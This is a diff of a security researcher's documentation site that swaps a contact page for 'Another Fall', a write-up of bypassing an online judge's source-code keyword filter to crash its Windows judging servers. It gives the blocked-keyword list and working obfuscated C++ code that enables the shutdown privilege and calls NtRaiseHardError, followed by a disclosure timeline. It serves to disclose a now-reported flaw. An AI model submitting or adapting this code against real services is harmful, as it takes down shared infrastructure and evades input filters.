@@ -5,9 +5,9 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="description" content="Reach out to me if you have anything to say!">
-<meta name="keywords" content=" contact">
-<title>Contact Information | Documentation for vulnerabilties found by Khaled Mohamed</title>
+<meta name="description" content="Bypassing the last fixes and taking down the servers again!">
+<meta name="keywords" content=" anotherfall">
+<title>Another Fall | Documentation for vulnerabilties found by Khaled Mohamed</title>
 <link rel="stylesheet" href="css/syntax.css">
 
 
@@ -132,7 +132,7 @@
 
 
 
-  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the Contact Information page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>
+  <a class="email" title="Submit feedback" href="#" onclick="javascript:window.location='mailto:?subject=Breaking Down feedback&body=I have some feedback about the Another Fall page: ' + window.location.href;"><i class="fa fa-envelope-o"></i> Feedback</a>
 
 </li>
 
@@ -150,7 +150,7 @@
                                 searchInput: document.getElementById('search-input'),
                                 resultsContainer: document.getElementById('results-container'),
                                 dataSource: 'search.json',
-                                searchResultTemplate: '<li><a href="{url}" title="Contact Information">{title}</a></li>',
+                                searchResultTemplate: '<li><a href="{url}" title="Another Fall">{title}</a></li>',
                     noResultsText: 'No results found.',
                             limit: 10,
                             fuzzy: true,
@@ -263,7 +263,7 @@
         <!-- Content Column -->
         <div class="col-md-9" id="tg-sb-content">
             <div class="post-header">
-   <h1 class="post-title-main">Contact Information</h1>
+   <h1 class="post-title-main">Another Fall</h1>
 </div>
 
 
@@ -271,7 +271,7 @@
 <div class="post-content">
 
    
-    <div class="summary">Reach out to me if you have anything to say!</div>
+    <div class="summary">Bypassing the last fixes and taking down the servers again!</div>
    
 
     
@@ -302,13 +302,71 @@ $('#toc').on('click', 'a', function() {
 
     
 
-  <p><i class="fab fa-skype fa-lg"></i>: k.m.epvp@gmail.com</p>
+  <h2 id="episode-3">Episode 3:</h2>
+<p>So the code from last episode was fixed and everyone was happy, not me though. I noticed that the message returned by the invoker was different this time.</p>
 
-<p><i class="fab fa-telegram fa-lg"></i>: @ex0FF</p>
+<p>Normally, you get some outstream and the return exit code of your main function. This time I was getting some weird exception message that was coming from some Java application. This Java application turned out to be the invoker. The invoker was doing some string checks on the source code before sending it to the compiler. This is bad, never do this if you have some similar service to that of an online judge.</p>
 
-<p><i class="fa fa-at fa-lg"></i>: k.m.epvp@gmail.com</p>
+<p>After a while I was able to collect a list of keywords that were blocked from my previous code. It went as follows:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ntstatus
+LoadLibrary
+GetProcAddressA
+ntdll.dll
+...
+</code></pre></div></div>
 
-<p><i class="fab fa-discord fa-lg"></i>: Exo#9259</p>
+<p>Now we’re using C++ we have the almighty power of pointers. We also have macros. We can get pointers to functions then invoke them manually. Let’s also escape some new lines to obfuscate our literals.</p>
+
+<p>And after some magic we get this…</p>
+<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;Windows.h&gt;
+</span><span class="cm">/*#include &lt;n\
+tst\
+atu\
+s.h&gt;*/</span>
+
+<span class="k">typedef</span> <span class="kt">long</span><span class="p">(</span><span class="kr">__stdcall</span><span class="o">*</span><span class="n">radj</span><span class="p">)(</span><span class="n">ULONG</span><span class="p">,</span><span class="n">BOOLEAN</span><span class="p">,</span><span class="n">BOOLEAN</span><span class="p">,</span><span class="n">PBOOLEAN</span><span class="p">);</span>
+<span class="k">typedef</span> <span class="kt">long</span><span class="p">(</span><span class="kr">__stdcall</span><span class="o">*</span><span class="n">rerr</span><span class="p">)(</span><span class="kt">long</span><span class="p">,</span><span class="n">ULONG</span><span class="p">,</span><span class="n">ULONG</span><span class="p">,</span><span class="n">PULONG_PTR</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span>
+
+<span class="cp">#define lolib (Lo\
+adL\
+ibr\
+aryA(str2))
+</span>
+<span class="cp">#define gpa (G\
+etPr\
+ocA\
+ddress)
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">auto</span> <span class="n">str1</span> <span class="o">=</span> <span class="s">"R"</span> <span class="s">"tlAdj"</span> <span class="s">"ustPr"</span> <span class="s">"ivi"</span> <span class="s">"lege"</span><span class="p">;</span>
+    
+    <span class="k">auto</span> <span class="n">str2</span> <span class="o">=</span> <span class="s">"n"</span> <span class="s">"td"</span> <span class="s">"ll."</span> <span class="s">"d"</span> <span class="s">"ll"</span><span class="p">;</span>
+
+    <span class="k">auto</span> <span class="n">str3</span> <span class="o">=</span> <span class="s">"N"</span> <span class="s">"tRai"</span> <span class="s">"seHa"</span> <span class="s">"rdE"</span> <span class="s">"rror"</span><span class="p">;</span>
+
+    <span class="k">auto</span> <span class="n">fp1</span> <span class="o">=</span> <span class="p">(</span><span class="n">radj</span><span class="p">)</span><span class="n">gpa</span><span class="p">(</span><span class="n">lolib</span><span class="p">,</span> <span class="n">str1</span><span class="p">);</span>
+    <span class="n">BOOLEAN</span> <span class="n">enabled</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">fp1</span><span class="p">(</span><span class="mi">19</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">enabled</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">auto</span> <span class="n">fp2</span> <span class="o">=</span> <span class="p">(</span><span class="n">rerr</span><span class="p">)</span><span class="n">gpa</span><span class="p">(</span><span class="n">lolib</span><span class="p">,</span> <span class="n">str3</span><span class="p">);</span>
+        <span class="n">ULONG</span> <span class="n">response</span><span class="p">;</span>
+        <span class="n">fp2</span><span class="p">(</span><span class="mh">0xC0000002</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">response</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>And the result?</p>
+
+<p><img src="images/queue.png" /></p>
+
+<p>#Disclosure:
+<strong>On August 28th</strong>: I send another message to <a href="#" data-toggle="tooltip" data-original-title="Founder and CEO of Codeforces.">Mike</a> explaining to him that the string checks were a very bad measure and that he had to work his way through the machine permissions which weren’t strong enough on default Windows users.</p>
+
+<p><strong>On August 29th</strong>: He had a basic fix already running.</p>
+
+<p>In the coming episode I will share a few snippets of the codes I used to test around with the machines.</p>
 
 
     <div class="tags">
